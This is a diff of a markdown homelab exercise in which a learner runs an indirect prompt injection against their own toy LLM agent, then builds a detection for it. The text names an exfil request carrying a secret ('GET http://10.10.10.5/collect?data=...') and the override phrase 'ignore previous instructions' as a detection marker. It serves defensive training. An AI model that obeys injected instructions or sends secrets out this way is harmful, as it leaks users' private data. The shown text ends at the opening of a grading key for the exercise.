@@ -3,7 +3,7 @@
 **Tier 3 · ATT&CK: MITRE ATLAS (LLM Prompt Injection / Exfil), T1041 (Exfil over C2) · Learning-Track Stage 5 crossover**
 
 ## Story
-The toy LLM agent you built in Learning-Track Stage 2 — the one with a "read a file" and "run a command" tool, or a RAG over your notes — just processed a document containing a hidden instruction. Did the **indirect injection** fire, did it reach the lethal trifecta (private data + untrusted content + an exfil path), and does your logging even show it?
+The toy LLM agent you built in Learning-Track Stage 2 (the one with a "read a file" and "run a command" tool, or a RAG over your notes) just processed a document containing a hidden instruction. Did the **indirect injection** fire, did it reach the lethal trifecta (private data + untrusted content + an exfil path), and does your logging even show it?
 
 This is the case file that ties both tracks together: an AI attack you run in your own homelab and detect with your own telemetry.
 
@@ -24,15 +24,15 @@ Rotate the seeded fake secret, revert to `baseline`. Keep the pcap and app logs.
 
 ## What telemetry this generates
 - **App logs**: the injected instruction appearing in retrieved/tool content, a tool call the *user* never asked for (a file read + an outbound request), and the assembled exfil URL.
-- **Egress pcap**: the `GET http://10.10.10.5/collect?data=...` carrying the secret — the trifecta completing on the wire.
+- **Egress pcap**: the `GET http://10.10.10.5/collect?data=...` carrying the secret. The trifecta completing on the wire.
 - **auditd** on the app VM: the file read of `secrets.env` by the app process.
-- Nothing in stock Wazuh understands "prompt injection" — the detection you build here is genuinely novel, which is exactly the Stage-5 point.
+- Nothing in stock Wazuh understands "prompt injection". The detection you build here is new, which is exactly the Stage-5 point.
 
 ## Your investigation (fill cold)
-Did the injection fire? Trace the trifecta: where did untrusted content enter (which retrieved doc/tool result), what private data did it reach, what was the exfil path? Reconstruct the exact outbound request and what it carried. Which single control breaks the chain (egress allowlist? tool gating? treating retrieved text as untrusted?) — map it to OWASP LLM / ATLAS. Would *any* of your current logging have alerted, or only forensics-after-the-fact?
+Did the injection fire? Trace the trifecta: where did untrusted content enter (which retrieved doc/tool result), what private data did it reach, what was the exfil path? Reconstruct the exact outbound request and what it carried. Which single control breaks the chain (egress allowlist? tool gating? treating retrieved text as untrusted?)? Map it to OWASP LLM / ATLAS. Would *any* of your current logging have alerted, or only forensics-after-the-fact?
 
 ## Detection engineering
-This is the deliverable the Learning Track has been building toward: a working **detection for an AI attack**. Options — an egress rule on the app VM alerting on outbound requests to non-allowlisted hosts (breaks the exfil leg cleanly), a log rule matching injection markers ("ignore previous instructions", tool calls not traceable to a user turn), or a guard that flags retrieved content containing imperative instructions. Ship one, prove it fires against your own attack, and write it up — that's a publishable piece (Learning-Track Stage 5 checkpoint).
+This is the deliverable the Learning Track has been building toward: a working **detection for an AI attack**. Options: an egress rule on the app VM alerting on outbound requests to non-allowlisted hosts (breaks the exfil leg cleanly), a log rule matching injection markers ("ignore previous instructions", tool calls not traceable to a user turn), or a guard that flags retrieved content containing imperative instructions. Ship one, prove it fires against your own attack, and write it up. That is a publishable piece (Learning-Track Stage 5 checkpoint).
 
 <details>
 <summary>Grading key — do not open until your verdict is written</summary>
